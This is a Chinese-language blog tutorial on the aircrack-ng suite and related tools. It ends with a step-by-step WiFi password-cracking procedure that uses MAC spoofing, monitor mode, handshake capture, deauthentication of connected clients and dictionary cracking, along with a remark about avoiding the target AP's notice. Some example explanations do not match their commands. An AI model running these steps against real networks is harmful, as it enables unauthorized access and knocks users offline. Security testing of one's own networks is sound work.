---
title: "无线攻击之aircrack-ng"
onlyTitle: true
date: 2023-06-10 13:05:36
categories:
- 杂七杂八
tags:
- aircrack-ng
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B883.jpg
---



# 无线攻击之aircrack-ng套件

## 一、aircrack-ng简介

Aircrack- ng 是一个完整的工具套件，以评估 WiFi 网络的安全性。它着重于WiFi 安全的不同领域： 

监视：数据包捕获并将数据导出到文本文件，以供第三方工具进行进一步处理 

攻击：通过数据包注入来重放攻击，取消身份验证，伪造的接入点和其他攻击 

测试：检查 WiFi 卡和驱动程序功能（捕获和注入） 

破解：WEP 和 WPA PSK（WPA 1 和 2） 

所有工具都是命令行，允许进行大量脚本编写。许多 GUI 都利用了此功能。它主要适用于 Linux。 

## 二、aircrack-ng常用工具介绍

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps47.jpg) 

### （一） Airbase-ng

Airbase-ng 是多功能工具，实现的主要思想是，旨在攻击客户端，鼓励客户端与伪造的 AP 关联，而不是阻止他们访问真实的 AP。主要功能有：  

实施 Caffe Latte WEP 客户端攻击  

实施 Hirte WEP 客户端攻击  

能够捕获 WPA / WPA2 握手的能力 

可以充当临时访问点 

能够充当完整的接入点 

能够按 SSID 或客户端 MAC 地址进行过滤 

能够处理和重新发送数据包 

能够加密发送的数据包和解密接收的数据包 

 

#### 1、 语法格式

【语法】airbase-ng \<option\> 

Option： 

-a bssid：设置接入点 MAC 地址 

-i iface：从此接口捕获数据包 

-w WEP key：使用此 WEP 密钥加密 / 解密数据包 

-h MAC：用于 MITM 模式的源 mac 

-f disallow：禁止指定的客户端 MAC（默认值：允许） 

-W 0 | 1：[不] 在信标 0 | 1 中设置 WEP 标志（默认：自动） 

-q：安静（不打印统计信息） 

-v：详细（打印更多消息）（长–详细） 

-M：[指定的] 客户端和 bssids 之间的 MITM（当前未实现） 

-A：点对点模式 (允许其他客户端对等)(Long–点对点)。 

-Y in | out |Both：外部数据包处理 

-c channel：设置 AP 运行的通道 

-X：隐藏的 ESSID（长–隐藏） 

-s：强制共享密钥认证 

-S：设置共享密钥挑战长度（默认值：128） 

-L：Caffe-Latte 攻击（长– 拿铁咖啡） 

-N：Hirte 攻击（cfrag 攻击），针对 wep 客户端创建 arp 请求（long -cfrag）-x nbpps：每秒的数据包数（默认值：100） 

-y：禁用对广播探测的响应 

-0：设置所有 WPA，WEP，打开标签。不能与 - z 和 - Z 一起使用 

-z type：设置 WPA1 标签。1 = WEP40 2 = TKIP 3 = WRAP 4 = CCMP 5 = WEP104 

-Z type :：与 - z 相同，但适用于 WPA2 

-V type :：假 EAPOL 1 = MD5 2 = SHA1 3 = 自动 

-F prefix：将所有已发送和已接收的帧写入 pcap 文件 

-P：即使指定 ESSID，也响应所有探测 

-I interval：以毫秒为单位设置信标间隔值 

-C 秒：启用信标探测的 ESSID 值（需要 - P） 

过滤器选项： 

-bssid ：要筛选 / 使用的 bssid (简称 - b) 

-bssids ：从该文件读取 BSSID 列表 (j-B) 

-client ：客户端的 MAC 接受（短 - d） 

-clients ：从该文件中读取 Mac 列表 (（短 - D） 

-essid ：指定单个 ESSID（短 - e） 

-essids ：从该文件中读取 ESSID 列表 (短 - E) 

#### 2、 使用示例

（1）airbase-ng -c 9 -e WiFiClass -N -W 1 wlan0 

-c 9 指定通道 

-e teddy 过滤单个 SSID 

-N 指定 Hirte 攻击 

-W 1 强制信标指定 WEP 

rausb0 指定要使用的无线接口 

（2）捕获 WPA 握手包 

airbase-ng -c 9 -e WiFiClass -z 2 -W 1 wlan0 

-c 9 指定通道 

-e teddy 过滤单个 SSID 

-z 2 指定 TKIP 

-W 1 设置 WEP 标志，因为有些客户机没有它。rausb0 指定要使用的无线接口 

必须根据客户端使用的密码来更改 - z 类型。TKIP 是 WPA 的典型代表。 



### （二） Airmon-ng

可用于在无线接口上启用监视模式。它也可以用于从监视模式返回到托管模式。输入不带参数的 airmon-ng 命令将显示接口状态。![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps48.jpg)

 

#### 1、语法格式

【语法 1】airmon-ng \<start|stop\> \<interface\> [channel] 

【语法 2】airmon-ng \<check\> [kill] 

start|stop：启动或停止监听模式 

interface：监听接口 

channel：监听信道 

check：列出所有可能干扰无线网卡的程序 

kill：结束所有可能干扰无线网卡的进程 

#### 2、使用示例

（1）列出所干扰无线网卡工作程序、结束所有干扰进程

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps49.jpg) 

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps50.jpg) 

注意：kill 后，网络管理器进程将被结束，若需要重新启用，则使用命令： 

systemctl enable --now NetworkManager

 

（2）启用监听模式

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps51.jpg) 

 

（3）停用监听模式 

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps52.jpg) 

 

### （三） Airodump-ng

Airodump-ng 用于原始 802.11 帧的数据包捕获，尤其适用于收集 WEP IV（初始化矢量），以用于将其与 aircrack-ng 一起使用 

#### 1、语法格式

【语法】airodump-ng \<options\> \<interface\>[,\<interface\>,...] 

Option： 

-H，–help：打印帮助信息界面 

-i，–ivs：只保存 IVs(只对破解有用).如果指定了此选项，则必须提供转储前缀(–write 选项) 

-g,–gpsd：指示 airodump-ng 应该尝试使用 GPSd 获取坐标。 

-w \<prefix\>,–write \<prefix\>：要使用的转储文件前缀。如果没有提供这个选项，它将只在屏幕上显示数据。在该文件旁边将创建与捕获文件相同文件名的 CSV 文件 

-e,–beacons：它将记录所有的信标到 cap 文件。默认情况下，它只记录每个网络的一个信标 

-u \<secs\>,–update \<secs\>：延迟\<秒\>显示更新之间的延迟(默认为 1 秒)。适用于 CPU 速度慢的情况。 

-showack：打印 ACK / CTS / RTS 统计数据。有助于调试和一般的注入优化。它表明如果你注入，注入太快，到达 AP，帧是有效的加密帧。允许探测“隐藏”的站，因为它们太远，无法捕获高比特率帧，因为 ACK 帧以每秒 1Mbps 的速度发送。-h：隐藏的站点. 

–berlin \<secs\>：当不再接收到任何数据包时，从屏幕上删除 AP/client 之前的时间(默认为120 秒)。 

-c \<channel\>[,\<channel\>[,…]],–channel \<channel\>[,\<\channel\>[,…]]：指出要监听的频道。默认情况下，airodump-ng 在所有 2.4GHz 通道上跳转。 

-b \<abg\>,–band \<abg\>：指出 airodump-ng 应该跳的波段。它可以是“a”、“b”和“g”字母的组合(“b”和“g”使用 2.4GHz，“a”使用 5GHz)。与——通道选项不兼容。 

-s \<method\>,–cswitch \<method\>：定义 airodump-ng 在使用多个网卡时设置通道的方式。 有效值:0 (FIFO，默认值)、1(轮询)或 2(最后一跳)。 

-2,–ht20：将通道设置为 HT20 (802.11n)。 

-3,–ht40+：设置通道为 HT40+ (802.11n)。它要求 20MHz 以上的频率是可用的(4 通道以上)，因此一些通道在 HT40+中是不可用的。HT40+在美国只有 7 个频道可用(欧洲大部分地区有9 个)。 

-5,–ht40-：将通道设置为 HT40-(802.11n)。它要求 20MHz 以下的频率是可用的(4 个通道是低的)，因此一些通道在 HT40-中是不可用的。在 2.4GHz 中，HT40 通道从 5 通道开始。 

-r \<file\>：从文件中读取数据包。 

-x \<msecs\>：主动扫描模拟(发送探测请求并解析探测响应)。 

-M,–manufacturer：显示一个制造商列，其中包含从 IEEE OUI 列表获得的信息。 

-U,–update：显示从其信标时间戳获得的 APs 正常运行时间。 

-W,–wps：显示 WPS 列，其中包含 WPS 版本、配置方法、从 APs 信标或探针响应(如果有的话)获得的 AP 设置锁定。 

–output-format \<formats\>：定义要使用的格式(用逗号分隔)。可能的值是:pcap, ivs, csv, gps, kismet, netxml。默认值为:pcap、csv、kismet、kismt -newcore。“pcap”是用于以 pcap 格式记录捕获的，“ivs”是用于 ivs 格式的(它是—ivs 的快捷方式)。“csv”将创建一个 airodump-ng csv 文件，“kismet”将创建一个 kismet csv 文件，“kismet-newcore”将创建一个 kismet netxml文件。“gps”是 gps 的简写。除 ivs 和 pcap 外，这些值可以合并。 

-I \<seconds\>,–write-interval \<seconds\>：输出文件的写入间隔为 CSV, Kismet CSV 和 Kismet NetXML，以秒为单位(最少 1 秒)。默认:5 秒。注意，间隔太小可能会减慢 airodump-ng。 

-K \<enable\>,–background \<enable\>：覆盖自动后台检测。使用“0”强制前台设置，使用“1”强制后台设置。它不会使 airodump-ng 作为守护进程运行，它将跳过后台自动检测和强制启用/禁用交互模式和显示更新。 

–ignore-negative-one：删除“固定通道\<接口\>:-1”的消息 

Filter options: 过滤选项： 

-t \<OPN|WEP|WPA|WPA1|WPA2\>,–encrypt \<OPN|WEP|WPA|WPA1|WPA2\>：将只显示与给定加密匹配的网络。可以多次指定:’-t OPN -t WPA2’ 

-d \<bssid\>,–bssid \<bssid\>：将只显示与给定 bssid 匹配的网络。 

-m \<mask\>,–netmask \<mask\>：将只显示网络，匹配给定的 bssid ^网掩码组合。需要–bssid(或-d)需要指定。 

-a：只显示关联的客户端。 

-N,–essid：通过 ESSID 过滤 APs。可以多次使用以匹配一组 ESSID。 

-R,–essid-regex：使用正则表达式通过 ESSID 过滤 APs。 



#### 2、使用示例

（1）只显示 ivs 信息，不保存扫描文件

airodump-ng -i wlan0mon

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps53.jpg) 

1.BSSID–无线AP（路由器）的MAC地址，如果你想PJ哪个路由器的密码就把这个信息记下来备用。
2.PWR–这个值的大小反应信号的强弱，越大越好。很重要！！！
3.RXQ–丢包率，越小越好，此值对PJ密码影响不大，不必过于关注、
4.Beacons–准确的含义忘记了，大致就是反应客户端和AP的数据交换情况，通常此值不断变化。
5.#Data–这个值非常重要，直接影响到密码PJ的时间长短，如果有用户正在下载文件或看电影等大量数据传输的话，此值增长较快。 
6.CH–工作频道。
7.MB–连接速度
8.ENC–编码方式。通常有WEP、WPA、TKIP等方式，本文所介绍的方法在WEP下测试100%成功，其余方式本人 并未验证。
9.ESSID–可以简单的理解为局域网的名称，就是通常我们在搜索无线网络时看到的列表里面的各个网络的名称

 

 

（2）以 ivs 格式保存扫描文件为 test

airodump-ng -i -w test wlan0mon

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps54.jpg) 

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps55.jpg) 

 

（3）获取位置信息

airodump-ng -g wlan0mon

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps56.jpg) 

 

（4）扫描指定信道

airodump-ng -c 6 wlan0mon

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps57.jpg) 

 

（5）将扫描到指定信道的信息包含位置信息保存到文件 test 中，将生成 6 个新文件

airodump-ng -c 6 -w test -g wlan0mon

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps58.jpg) 

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps59.jpg) 

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps60.jpg) 

 

（6）将扫描到指定信道的信息包含位置信息保存到文件 test 中，并指定输出格式为 pcap，将生成两个新文件

airodump-ng -c 6 -w test -g --output-format pcap wlan0mon

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps61.jpg) 

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps62.jpg) 

 

 

### （四） Aireplay-ng

Aireplay-ng 用于注入帧。主要功能是产生流量在以后使用了 Aircrack-ng的用于裂化 WEP 和 WPA-PSK 的密钥。为了捕获 WPA 握手数据，伪造的身份验证，交互式数据包重播，手工制作的 ARP 请求注入和 ARP 请求重新注入，有多种攻击可能会导致取消认证。 

#### 1、语法格式

【语法】aireplay-ng \<options\> \<replay interface\> 

***\*过滤器选项：\**** 

-b bssid：MAC 地址，访问点 

-d dmac：MAC 地址，目标 

-s smac：MAC 地址，源 

-m len：最小数据包长度 

-n len：最大数据包长度 

-u type：帧控制，类型字段 

-v subt：帧控制，子类型字段 

-t tods：帧控制，至 DS 位 

-f fromds：帧控制，从 DS 位开始 

-w iswep：帧控制，WEP 位 

对于除身份验证和伪身份验证以外的所有攻击，您可以使用以下过滤器来限制将哪些数据包呈现给特定攻击。最常用的过滤器选项是 “-b”，用于选择特定的接入点。对于典型用法，“-b”是您唯一使用的一个。 

 

***\*重播选项：\**** 

-x nbpps：每秒的数据包数 

-p fctrl：设置帧控制字（十六进制） 

-a bssid：设置接入点 MAC 地址 

-c dmac：设置目标 MAC 地址 

-h smac：设置源 MAC 地址 

-e essid：对于 fakeauth 攻击或注入测试，它设置目标 AP SSID。当未隐藏 SSID 时，这是可选的。 

-j：arpreplay 攻击：注入 FromDS pkts 

-g value：更改环形缓冲区的大小（默认值：8）-k IP：在片段中设置目标 IP 

-l IP：在片段中设置源 IP 

-o npckts：每个突发的包数（-1） 

-q sec：保持活动之间的秒数（-1） 

-y prga：共享密钥验证的密钥流 

-B 或 -bittest：比特率测试（仅适用于测试模式） 

-D：禁用 AP 检测。如果未听到 AP 信标，则某些模式将无法继续。这将禁用此功能。 

-F 或 -fast：选择第一个匹配的数据包。对于测试模式，它仅检查基本注入并跳过所有其他测试。 

-R 禁用 /dev/rtc 使用。一些系统遇到 RTC 的锁定或其他问题。这将禁用用法。 

 

***\*来源选项：\**** 

iface：从此接口捕获数据包 

-r 文件：从该 pcap 文件中提取数据包 

***\*攻击方式\****（仍然可以使用数字）： 

–deauth count：取消对 1 个或所有工作站的认证（-0） 

–fakeauth 延迟：与 AP 的伪认证（-1） 

–interactive：交互式帧选择（-2） 

–arpreplay：标准 ARP 请求重播（-3） 

–chopchop：解密 / 斩波 WEP 数据包（-4） 

–fragment：生成有效的密钥流（-5） 

####  2、使用示例

 

**获取握手包**

airodump-ng --bssid [目标wifimac] -c [目标wifi信道] -w [保存的文件名] wlan0mon

这里-c指定的扫描信道就是后续攻击的信道

注意!!!这里一定要与对方wifi信道相同否则抓不到握手包,也攻击不了

重新扫描一遍：由于是开的个人热点进行攻击，所以指定协议为WAP2

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps63.jpg) 

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps64.jpg) 

然后在上面命令运行的同时，再开一个终端进行攻击：

aireplay-ng -0 5 -a 8A:99:70:05:47:05 -c 7C:B2:7D:64:49:FC wlan0mon

获取到了握手包WPA handshake 8A:99:70:05:47:05

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps65.jpg) 

 

解释：-0为模式中的一种：冲突攻击模式，后面跟发送次数（设置为0，则为循环攻击，不停的断开连接，客户端无法正常上网，-a 指定无线AP的mac地址，即为该无线网的bssid值，上图可以一目了然。

-0：取消认证攻击 

1：攻击 1 次 

-a：要攻击的 AP MAC 地址 

-c：客户端的 MAC 地址 

Wlan0mon：使用的接口

 

 

### （五） Aircrack-ng

Aircrack-ng 是 802.11 WEP 和 WPA / WPA2-PSK 密 钥 破 解 程 序 。 一 旦使用airodump-ng 捕获了足够的加密数据包，Aircrack-ng 即可恢复 WEP 密钥。为了破解 WPA / WPA2 预共享密钥，仅使用字典方法。 

#### 1、语法格式

【语法】aircrack-ng [options] \<capture file(s)\> 

***\*常用选项：\**** 

-a amode：强制攻击模式（1 = 静态 WEP，2 = WPA / WPA2-PSK） 

-e essid：如果设置，将使用来自具有相同 ESSID 的网络的所有 IV。如果未广播 ESSID （隐藏），则 WPA / WPA2-PSK 破解也需要此选项。 

-b bssid：长版–bssid。根据接入点的 MAC 地址选择目标网络 

-p nbcpu：在 SMP 系统上：要使用的 CPU 数量。此选项在非 SMP 系统上无效 

-q none：启用安静模式（在没有找到密钥之前不输出状态） 

-C MACs：长版–combine。将给定的 AP（以逗号分隔）合并为虚拟 AP 

-l file name：（小写 L，ell）将密钥记录到指定的文件。覆盖文件（如果已存在） 

***\*WEP 和 WPA-PSK 破解选项：\**** 

-w words：单词列表或“-”的路径，用逗号分隔多个单词表 

-N file：创建一个新的破解会话并将其保存到指定的文件 

-R file：从指定文件还原破解会话 

***\*WPA-PSK 选项：\**** 

-E file： 创建 EWSA 项目文件 v3 

-j file：创建 Hashcat v3.6 + Capture 文件（HCCAPX） 

-J file：创建 Hashcat Capture 文件 

-S none：WPA 破解速度测试 

-Z sec：WPA 破解速度测试执行时间，以秒为单位 

-r database：利用 airolib-ng 生成的数据库作为输入来确定 WPA 密钥。如果 aircrack-ng 尚未使用 sqlite 支持进行编译，则输出错误消息 

 

#### 2、使用示例

使用字典 wordlist.txt 破解 hack-02.cap 握手包对应 AP 的密码

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps66.jpg) 

这是上一步抓到的握手包，新建一个wordlist.text进行攻击：

aircrack-ng -w wordlist.txt thekai-01.cap

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps67.jpg) 

### （六） ifconfig：用于查看和修改网卡状态

#### 1、语法格式 

【语法】ifconfig [-a] [-s] [interface] [down|up] 

-a：列出连接到当前系统的所有接口详细信息 

-s：列出所有可用接口 

interface：接口相关参数 

down：关闭指定网卡 

up：激活指定网卡 

#### 2、使用示例 

（1）查看本机接口信息

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps68.jpg) 

（2）列出所有可用接口

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps69.jpg) 

 

（3）关闭指定网卡

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps70.jpg) 

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps71.jpg) 

 

（4）激活指定网卡

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps72.jpg) 

 

### （七） macchanger：伪造 MAC 地址

#### 1、语法格式 

【语法】macchanger [option] device 

-a：伪造一个同厂的同类型随机 MAC 地址 

-A：伪造一个不同厂商不同类型的 MAC 地址 

-e：伪造一个同厂的随机 MAC 地址 

-s,--show：打印当前的 MAC。 当未指定其他选项时，这是默认操作。 

-r,--random：设置完全随机的 MAC。 

-m xx:xx:xx:xx:xx:xx 

--mac=xx:xx:xx:xx:xx:xx 修改为指定的 mac 地址 

-p,--permanent：将 MAC 地址重置为其原始的永久硬件值 

#### 2、使用示例 

（1）伪造一个同厂的同类型随机 MAC 地址。注意：若网卡为激活状态，则无法修改 MAC 地址，会显示设备忙。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps73.jpg) 

 

（2）伪造一个不同厂商不同类型的 MAC 地址

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps74.jpg) 

 

（3）伪造一个同厂的随机 MAC 地址

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps75.jpg) 

 

（4）修改为指定的 MAC 地址 

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps76.jpg) 

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps77.jpg) 

 

（5）取消伪造的 MAC 地址

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps78.jpg) 

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps79.jpg) 

 

### （八） iwconfig：配置无线网络设备或显示无线网络设备信息

#### 1、语法格式 

【语法】iwconfig [interface] [option] 

auto:自动模式 

essid:设置 ESSID 

nwid:设置网络 ID 

freq:设置无线网络通信频段 

chanel:设置无线网络通信频段 

sens:设置无线网络设备的感知阀值 

mode:设置无线网络设备的通信设备 

ap:强迫无线网卡向给定地址的接入点注册 

nick \<名字\>：为网卡设定别名 

rate \<速率\>：设定无线网卡的速率 

rts \<阀值\>：在传输数据包之前增加一次握手，确信信道在正常的 

power：无线网卡的功率设置 

#### 2、使用示例 

（1）查看无线网卡信息

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps80.jpg) 

（2）设备无线网卡工作模式为 monitor。注意：若网卡在激活状态，则会显示设备繁忙

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps81.jpg) 

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps82.jpg) 

 

三、aircrack-ng Wifi 密码破解基本步骤 

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps83.jpg) 

 

四、Wifi 密码破解实例 

1、Down 掉网卡：ifconfig wlan0 down

2、伪造 MAC 地址：macchanger –e wlan0 

3、激活网卡：ifconfig wlan0 up 

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps84.jpg) 

 

4、设置监听模式 

（1）结束占用无线网卡的进程：airmon-ng check kill 

（2）开启无线网卡监听模式：airmon-ng start wlan0 

（3）查看无线网卡状态：iwconfig

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps85.jpg) 

 

5、探测网络，查看周围 Wifi 信息：airodump-ng wlan0mon

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps86.jpg) 

6、监听抓包：airodump-ng --ivs --bssid AP_MAC –w hack wlan0mon 

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps87.jpg) 

 

7、攻击网络（需新开一个终端）：aireplay-ng -0 1 –a AP_Mac –c Client_Mac wlan0mon 

在监听抓包时，需要要求指定的 AP 有正在进行连接认证的客户端以获取握手包，若无正在认证客户端，将会导致长时间无法抓包成功，这时可以人为的将已经连接的客户强制断开。因为在连接 Wifi 时一般都选择了自动连接，所以一旦断开，客户端将会立即重新连接，此时就可以捕获到握手包。若一次不成功，则可以多攻击几次，但攻击次数过多有可能引起目标 AP 警觉，严重时可导致 AP 死机。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps88.jpg) 

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps89.jpg) 

 

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps90.jpg) 

 

8、破解密码：aircrack-ng –w wordlist.txt thakai-05.ivs

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps91.jpg) 

 

 